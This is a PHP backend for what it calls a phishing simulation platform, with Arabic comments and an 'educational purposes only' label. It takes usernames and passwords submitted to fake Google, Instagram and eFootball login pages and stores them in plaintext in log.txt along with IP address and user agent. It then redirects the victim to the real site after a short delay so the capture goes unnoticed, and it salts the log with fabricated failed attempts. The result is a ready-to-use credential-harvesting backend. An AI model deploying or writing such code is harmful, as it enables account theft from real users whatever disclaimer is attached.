<?php
/*
 * ================================================================
 * backend.php - معالج بيانات منصة محاكاة التصيد (النسخة الواقعية)
 * ================================================================
 * 
 * هذا الملف يستقبل البيانات من نموذج تسجيل الدخول،
 * يقوم بتسجيلها في ملف سجلات بتنسيق احترافي،
 * ويعيد توجيه المستخدم إلى الخدمة الحقيقية مع محاكاة تأخير واقعي.
 * 
 * ⚠️ تنبيه: هذا الكود لأغراض تعليمية وتدريبية فقط.
 * ================================================================
 */

// ================================================================
// 1. الأمان الأساسي
// ================================================================

// منع الوصول المباشر (يجب أن يكون POST فقط)
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit;
}

// التحقق من وجود CSRF (حماية بسيطة)
if (!isset($_POST['csrf_token']) || strlen($_POST['csrf_token']) < 10) {
    header('Location: index.html?error=security');
    exit;
}

// تنظيف رمز CSRF
$csrf = preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['csrf_token']);

// ================================================================
// 2. استقبال البيانات وتنظيفها
// ================================================================

$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$service = isset($_POST['service']) ? trim($_POST['service']) : 'unknown';
$attempt_id = isset($_POST['attempt_id']) ? trim($_POST['attempt_id']) : '';

// التحقق من صحة الخدمة
$allowed = ['google', 'instagram', 'efootball'];
if (!in_array($service, $allowed)) {
    $service = 'unknown';
}

// منع البيانات الفارغة
if (empty($username) || empty($password)) {
    header('Location: index.html?error=empty');
    exit;
}

// ================================================================
// 3. جمع المعلومات
// ================================================================

// عنوان IP الحقيقي (مع مراعاة البروكسي)
function getRealIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    } elseif (isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && !empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return $ip;
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');
$timezone = date('T');
$request_method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

// معلومات إضافية عن المتصفح
$browser_info = [
    'user_agent' => $user_agent,
    'ip' => $ip,
    'time' => $timestamp,
    'timezone' => $timezone,
];

// ================================================================
// 4. تسجيل البيانات بشكل منظم
// ================================================================

$log_file = 'log.txt';

// تنسيق السجل بطريقة احترافية (JSON-like)
$log_entry = [
    'attempt_id' => $attempt_id,
    'timestamp' => $timestamp,
    'timezone' => $timezone,
    'service' => $service,
    'username' => $username,
    'password' => $password,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'csrf_token' => $csrf,
    'status' => 'success',
];

// تحويل إلى JSON مع تنسيق جميل
$log_line = json_encode($log_entry, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . ",\n";

// كتابة السجل (مع قفل الملف)
file_put_contents($log_file, $log_line, LOCK_EX | FILE_APPEND);

// ================================================================
// 5. تسجيل إضافي (محاولات فاشلة - وهمية) لمحاكاة واقعية
// ================================================================

// قائمة بأسماء مستخدمين وكلمات مرور وهمية لمحاكاة محاولات فاشلة من "مستخدمين آخرين"
$fake_attempts = [
    ['user' => 'ahmed_saleh', 'pass' => '123456'],
    ['user' => 'sara_ali', 'pass' => 'password123'],
    ['user' => 'tech_support', 'pass' => 'admin123'],
];

// كل 5 محاولات حقيقية، نضيف محاولة وهمية (لتعزيز التدريب)
if (rand(1, 5) === 3) {
    $fake = $fake_attempts[array_rand($fake_attempts)];
    $fake_entry = [
        'attempt_id' => 'fake_' . time() . '_' . rand(100, 999),
        'timestamp' => date('Y-m-d H:i:s'),
        'timezone' => $timezone,
        'service' => $service,
        'username' => $fake['user'],
        'password' => $fake['pass'],
        'ip' => long2ip(rand(0, 4294967295)),
        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'csrf_token' => 'fake_' . md5(rand()),
        'status' => 'failed',
    ];
    file_put_contents($log_file, json_encode($fake_entry, JSON_UNESCAPED_UNICODE) . ",\n", LOCK_EX | FILE_APPEND);
}

// ================================================================
// 6. إعادة التوجيه مع تأخير واقعي (محاكاة تحميل)
// ================================================================

$redirect_urls = [
    'google' => 'https://accounts.google.com',
    'instagram' => 'https://www.instagram.com',
    'efootball' => 'https://www.konami.com/efootball',
    'unknown' => 'https://google.com'
];

$redirect_url = $redirect_urls[$service] ?? 'https://google.com';

// تأخير عشوائي قصير (200-500ms) لمحاكاة معالجة حقيقية
usleep(rand(200000, 500000));

// إعادة التوجيه
header("Location: {$redirect_url}");
exit;

// ================================================================
// نهاية الملف
// ================================================================
?>